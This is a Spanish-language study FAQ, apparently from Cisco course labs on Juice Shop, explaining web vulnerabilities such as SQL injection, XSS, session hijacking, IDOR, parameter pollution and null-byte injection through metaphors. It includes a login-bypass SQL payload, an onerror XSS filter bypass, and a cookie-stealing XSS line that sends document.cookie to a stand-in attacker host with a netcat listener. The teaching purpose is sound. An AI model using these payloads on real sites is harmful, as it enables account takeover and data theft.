# 🧠 FAQ y Conceptos de Vulnerabilidades Detectadas

Este documento centraliza las explicaciones detalladas y respuestas a preguntas específicas surgidas durante el análisis de los laboratorios y el temario de Cisco.

---

## 🔍 Vulnerabilidades en Detalle

### 1. Improper Error Handling (Gestión Inadecuada de Errores)
**¿Qué es?** Ocurre cuando una aplicación revela información sensible a través de sus mensajes de error (comoStack Traces, versiones de software o rutas internas).

**Caso Práctico:** En Juice Shop, al solicitar archivos inexistentes en `/ftp`, el sistema devolvía un **Stack Trace**.
- **¿Qué es un Stack Trace?** Es una lista detallada de las funciones y archivos que se estaban ejecutando en el momento del error. Es como una "hoja de ruta" del fallo.
- **¿Por qué es peligroso?**
    - Reveló el framework y versión: `Express ^4.21.0`.
    - Expuso rutas internas: `/juice-shop/build/routes/fileServer.js`.
- **Impacto:** Facilita el **Fingerprinting** (identificación de tecnologías) y ayuda a los atacantes a buscar vulnerabilidades específicas (CVEs) para esas versiones exactas.

---

## ❓ Preguntas Directas del Mentor

> **P: ¿Qué pasó exactamente con la VULN-06 de Juice Shop?**
> 
> **R:** El servidor entró en "pánico" al no encontrar un archivo y, al no tener un manejador de errores seguro, volcó toda la información técnica interna en la pantalla del usuario. En lugar de un "Archivo no encontrado", dio una clase magistral sobre cómo está programado por dentro.

---

## 🏛️ Conceptos de Arquitectura y Diseño

### 2. Modelado de Amenazas (Threat Modeling)
**¿Qué es?** Es un proceso estructurado para identificar qué puede ir mal en un sistema antes de que ocurra. Es "hackear" el diseño en papel para encontrar debilidades.

#### Metodología STRIDE (¿Qué puede pasar?)
Es un acrónimo para clasificar tipos de ataques:
- **S**poofing (Suplantación): Hacerse pasar por otro.
- **T**ampering (Manipulación): Modificar datos o código.
- **R**epudiation (Repudio): Negar haber hecho una acción.
- **I**nformation Disclosure (Fuga de datos): Ver lo que no te toca.
- **D**enial of Service (DoS): Bloquear el sistema.
- **E**levation of Privilege: Ser administrador siendo usuario normal.

#### Metodología DREAD (¿Cómo de grave es?)
Se usa para puntuar el riesgo (1-10):
- **D**amage: Daño causado.
- **R**eproducibility: Facilidad para repetirlo.
- **E**xploitability: Facilidad para ejecutarlo.
- **A**ffected Users: Cuánta gente sufre.
- **D**iscoverability: Facilidad para encontrar el fallo.

---

## 💉 Vulnerabilidades de Inyección y Scripting

### 3. SQL Injection (Bypass de Login)
**¿Qué pasó exactamente?** 
El servidor tiene una "llave" lógica para dejarte entrar. La consulta suele ser: "Déjalo pasar si el email es X Y la contraseña es Y".

**El Truco del Payload (`' or 1=1--`):**
1.  **La Comilla (`'`):** Rompe la frase original del servidor.
2.  **La Lógica (`or 1=1`):** Añadimos una condición que **siempre es verdadera**. Es como decirle al portero: "Déjame pasar si tengo la invitación O si el sol sale por el este". Como el sol siempre sale por el este, la invitación ya no importa.
3.  **El Comentario (`--`):** Le dice al servidor que ignore el resto de la frase original (donde pedía la contraseña).
- **Resultado:** Entras como el primer usuario de la base de datos (normalmente el admin) sin saber un solo carácter de su password.

### 4. XSS Reflejado vs DOM-based

#### A. XSS Reflejado (El "Megáfono")
**Mecánica:** Tú le envías un script al servidor (vía URL) y el servidor, como un megáfono, lo repite de vuelta en el HTML para que tu navegador lo ejecute.

**Bypass de filtros (`<img src=x onerror=...>`)**: 
Muchos filtros buscan la palabra `<script>`. Al usar una etiqueta de imagen con una ruta rota (`src=x`), forzamos al navegador a ejecutar el "Plan B" (el evento `onerror`), que es donde escondemos nuestro código malicioso. Es un caballo de Troya para saltar protecciones básicas.

#### B. DOM-based XSS (El "Encargo al Mayordomo")
**La gran diferencia:** En el XSS Reflejado, el servidor ve el ataque. En el **DOM-based**, ¡el servidor no se entera de nada!

**Por qué no llega al servidor:**
El payload suele ir después de un símbolo `/#/`. Todo lo que va tras el `#` es para el navegador (el cliente), no para el servidor. 
- El servidor entrega una página "limpia" con Javascript.
- Ese Javascript del cliente lee la URL, coge tu código malicioso y lo inyecta directamente en la página (el DOM). 
- **Metáfora:** Es como dejarle una nota al mayordomo (navegador) para que cambie los cuadros de la casa mientras el dueño (servidor) está durmiendo y no ve quién entra.

---

## 🍪 Gestión de Sesiones y Robo de Datos

### 5. Session Hijacking (Secuestro de Sesión)
**¿Qué es?** Es el acto de robar la "identidad temporal" de un usuario. En lugar de robar la contraseña, robas la prueba de que el usuario ya se ha autenticado.

**La Metáfora: La Pulsera VIP.**
Imagina que entras en un festival tras enseñar tu DNI (login). Te ponen una **pulsera VIP** (la Cookie de Sesión). A partir de ese momento, los guardias ya no te piden el DNI, solo miran tu pulsera.
- **El Robo:** El atacante no intenta falsificar tu DNI, intenta cortarte la pulsera mientras no miras y ponérsela él. Si lo logra, el guardia (el servidor) creerá que el atacante es el dueño original.

**¿Cómo funciona el ataque técnico?**
1.  **El Receptor (Netcat - `nc -l -p 8888`):** El atacante abre una "oreja digital" en su propia máquina. Está esperando que llegue información a ese puerto. Es como abrir un buzón de correos clandestino.
2.  **El Gancho (XSS):** El atacante inyecta un script en la web. Cuando la víctima entra, su propio navegador ejecuta:
    `document.location='http://[IP_KALI]:8888/?cookie=' + document.cookie`
3.  **La Acción:** El navegador de la víctima, sin que ella lo sepa, hace una petición al buzón del atacante enviándole su "pulsera VIP" (`document.cookie`) en la URL.
4.  **El Resultado:** El atacante mira su terminal de `netcat`, ve la cookie, se la pone en su propio navegador y ¡listo! Ya está dentro de la cuenta de la víctima.

### 6. IDOR (Insecure Direct Object Reference)
**¿Qué pasó exactamente?**
El sistema te da un recurso (una factura, un archivo) basándose solo en un número o ID que tú le pasas, confiando ciegamente en que tienes permiso para verlo solo porque "lo has pedido".

**La Metáfora: El Guardarropa.**
Vas a un guardarropa y entregas tu ticket con el número 100. El empleado te da tu chaqueta. Pero, ¿qué pasa si tú mismo tachas el 100 y pones 101? 
- Si el empleado te da la chaqueta 101 sin comprobar si realmente es tuya, estamos ante un **IDOR**.
- **Impacto:** Puedes "robar" las chaquetas (datos) de todos los asistentes solo cambiando el número del ticket.

### 7. HPP (HTTP Parameter Pollution)
**¿Qué es?** Consiste en enviar múltiples parámetros con el mismo nombre (`?id=1&id=2`) para confundir la lógica del servidor o saltarse protecciones (WAF).

**Comportamiento técnico (Crucial para examen):**
Cada servidor interpreta la colisión de parámetros de forma distinta:
-   **PHP / Apache:** Se queda con el **último** valor recibido.
-   **JSP / Tomcat:** Se queda con el **primer** valor recibido.
-   **ASP.NET:** Los **concatena** (ej: `1,2`).

**¿Para qué sirve?**
-   **Bypass de WAF:** El Firewall puede que solo analice el primer `id` (buscando SQLi), pero si el servidor final procesa el segundo, hemos colado el ataque.
-   **Bypass de Lógica:** Engañar a sistemas que validan una condición en el primer parámetro pero ejecutan la acción sobre el segundo.

---

## 🛡️ Criptografía y Seguridad de Datos

### 8. HMAC (Hash-based Message Authentication Code)
**¿Qué es?** Es un código de autenticación que garantiza tanto la **integridad** como la **autenticidad** de un mensaje. Se basa en una función de hash (como SHA-256) combinada con una **clave secreta compartida**.

**La Metáfora: El Sello de Lacre con Firma Secreta.**
Imagina que envías una carta.
1.  **Hash normal:** Es como cerrar el sobre. Si alguien lo abre y cambia la carta, el sello se rompe. Pero cualquiera puede poner un sello nuevo.
2.  **HMAC:** Es como si tú y el destinatario tuvierais un sello con un diseño secreto único que solo vosotros conocéis. Si alguien cambia la carta, no podrá volver a sellarla con el mismo diseño. El destinatario sabrá que la carta fue alterada o que no la enviaste tú.

**¿Cómo funciona técnicamente?**
1.  **Concatenación:** Se juntan los datos (ej: `id=1&precio=10`).
2.  **Hashing con Clave:** Se aplica el hash a esos datos "mezclados" con la clave secreta: `Hash(Clave + Mensaje)`.
3.  **Resultado:** Se genera una cadena alfanumérica única (la "firma").
4.  **Verificación:** El servidor recibe los datos y la firma. Vuelve a calcular el hash con los datos recibidos y su clave secreta. Si coinciden, los datos son válidos.

**¿Para qué sirve?**
-   **Firma de Parámetros:** Evitar que un usuario cambie el precio de un producto en la URL o en un formulario.
-   **Seguridad en APIs:** Asegurar que las peticiones entre servidores no han sido manipuladas por un intermediario (MitM).

---

## 📂 Manipulación de Rutas y Archivos

### 9. Null Byte Injection (Inyección de Byte Nulo)
**¿Qué es?** Es una técnica que utiliza el carácter nulo (`\0` o `%00`) para engañar a los filtros de una aplicación y acceder a archivos o rutas que deberían estar prohibidas.

**La Metáfora: El Inspector de Trenes Despistado.**
Imagina que un inspector revisa billetes. Solo permite pasar a los que van a "Madrid".
1.  **El Truco:** Tú tienes un billete que dice "Secreto.zip[NULO]Madrid". 
2.  **La Aplicación (Inspector moderno):** Mira el final de la frase. "Ah, pone Madrid al final, puedes pasar".
3.  **El Sistema (Inspector antiguo/SO):** Mira la frase de izquierda a derecha. Cuando llega al "[NULO]", deja de leer y piensa: "Este billete es para Secreto.zip". 
4.  **Resultado:** Te deja entrar al vagón de "Secreto.zip" aunque el inspector de la puerta creía que ibas a "Madrid".

**¿Cómo funciona técnicamente?**
1.  **Diferencia de Lenguajes:** Lenguajes como JavaScript (Node.js) gestionan cadenas por su longitud. Lenguajes como C (en los que suelen estar escritos el Kernel y los sistemas de archivos) terminan de leer cuando encuentran un byte cero (`0x00`).
2.  **El Ataque:** Inyectas el byte nulo en la URL (ej: `archivo.conf%00.pdf`). El filtro de la web ve `.pdf` y lo acepta. El servidor, al intentar abrirlo, para de leer en el `%00` e intenta abrir `archivo.conf`.

**¿Para qué sirve?**
-   **Bypass de Extensiones:** Descargar archivos de configuración, backups o bases de datos (ej: `.kdbx`, `.yml`, `.env`) saltándose filtros que solo permiten imágenes o documentos.

### 8. Clickjacking (Secuestro de Click)
**¿Qué pasó exactamente?**
El atacante "engaña" al usuario para que haga clic en algo que no ve. Coloca la web legítima dentro de un marco invisible (iframe) encima de una web maliciosa.

**La Metáfora: El Botón Fantasma.**
Imagina que estás en una feria y ves un botón rojo gigante que dice "Ganar Premio Gratis". Tú pulsas el botón emocionado. Lo que no ves es que encima de ese botón hay una lámina de cristal invisible que tiene pegado otro botón: "Transferir todo mi dinero". Al pulsar el premio, en realidad has pulsado el botón invisible de transferencia.
- **Defensa:** Usar cabeceras como `X-Frame-Options` para prohibir que tu web se meta dentro de marcos ajenos.

---
*(Documento en constante actualización según avancemos en el repaso)*
